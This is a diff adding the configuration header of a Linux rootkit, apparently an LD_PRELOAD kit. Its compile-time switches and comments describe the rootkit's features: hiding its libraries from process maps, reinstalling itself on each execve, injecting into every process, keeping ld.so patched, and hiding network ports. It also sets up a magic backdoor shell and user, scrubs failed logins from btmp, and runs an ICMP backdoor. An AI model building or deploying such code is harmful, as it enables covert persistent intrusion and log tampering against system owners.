@@ -1,0 +1,37 @@
+/* dependencies for the kit are hidden from /proc/%d/\*maps. namely these dependencies are libcrypt & libpcap.
+ * if for any reason, this should be a problem, define this. */
+#undef NO_HIDE_DEPENDENCIES
+
+/* each call to __libc_start_main, execve & execvp results in the kit making sure preloadpath exists & contains the kit's sopath.
+ * of course, this behaviour only applies if the kit is still on the box. plus if ld.so is patched. */
+#define ALWAYS_REINSTALL
+
+/* upon installation/update the rootkit will inject itself to all processes on the box. define to disable. */
+#undef NO_INJECT_PROCS
+
+/* if still installed, the kit will make sure ld.so remains patched. define to disable. */
+#undef NO_PROTECT_LDSO
+
+/* max hidden ports that the kit can store in its config file. this value cannot be changed after install. */
+#define MAX_HIDE_PORTS 8
+
+/* remove a 1.6~kb big fuck you. */
+#undef NO_ROOTKIT_ANSI
+
+/* if you want `./bdv unhideself` to still let you access rootkit stuff, define this.
+ * if anyone looks at the environment variables set in your unhidden process, they'll see a big long random totally-not-malicious variable... */
+#undef SET_MAGIC_ENV_UNHIDE
+
+/* allows safe access to package managers from magic shell. */
+#define BACKDOOR_PKGMAN
+
+/* /var/log/btmp stores information on failed logins for users - the kit can remove failed login attempts for your backdoor user.
+ * if you think this will be useful for you, undefine this. this file can reach pretty substantial sizes, so when logging in as magicusr,
+ * you might notice a short delay before you can do anything. */
+#define NO_BTMP_CLEAN
+
+/* define this if you don't want pcap stuff in the kit. icmp backdoor must also be disabled.
+ * I assume you're gonna link without libpcap too if you define this. */
+#undef NO_PCAP_STUFF
+
+/* everything past here is setup.py */
